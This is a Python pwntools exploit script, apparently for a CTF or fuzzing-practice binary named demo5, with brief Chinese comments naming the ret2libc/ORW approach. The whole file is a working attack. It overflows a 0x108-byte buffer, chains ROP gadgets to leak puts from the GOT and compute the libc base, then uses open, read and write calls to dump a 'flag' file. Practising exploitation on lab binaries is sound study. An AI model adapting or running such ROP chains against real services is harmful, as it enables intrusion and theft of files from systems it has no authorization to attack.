#encoding=utf-8
#canary涉及相关的逻辑操作，若有canary请自己泄露
#ubuntu-18 ret2libc system or orw
from pwn import *
context(log_level='debug',arch='amd64')
elf=ELF('../fuzz-demo/demo5')
libc=elf.libc
r=process('../fuzz-demo/demo5')
r.recv(timeout=1)
rdi=0x400883
rdx=next(libc.search(asm('pop rdx;ret')))
pop_rsi_r15_ret=0x400881
ret=0x40051e
Hierarchical=0x40074d
r.recv(timeout=1)
r.send(b'HRPSS')
r.recv(timeout=1)
r.sendline(b'-44')
puts_got=elf.got['puts']
puts_plt=elf.plt['puts']
payload=b'a'*0x108+p64(rdi)+p64(puts_got)+p64(puts_plt)+p64(Hierarchical)
r.send(payload)
leak=u64(r.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
base=leak-libc.sym['puts']
the_open=base+libc.sym['open']
the_write=base+libc.sym['write']
the_read=base+libc.sym['read']
bss=0x601358
rdx=base+rdx
payload2=b'a'*0x108+p64(rdi)+p64(0)+p64(pop_rsi_r15_ret)+p64(bss)+p64(0)+p64(rdx)+p64(0x200)+p64(the_read)+p64(Hierarchical)
r.send(payload2)
sleep(1)
r.send(b'flag\x00')
payload3=b'a'*0x108+p64(rdi)+p64(bss)+p64(pop_rsi_r15_ret)+p64(0664)+p64(0)+p64(the_open)
payload3+=p64(rdi)+p64(3)+p64(pop_rsi_r15_ret)+p64(bss)+p64(0)+p64(rdx)+p64(0x200)+p64(the_read)
payload3+=p64(rdi)+p64(1)+p64(pop_rsi_r15_ret)+p64(bss)+p64(0)+p64(the_write)
r.send(payload3)
r.interactive()
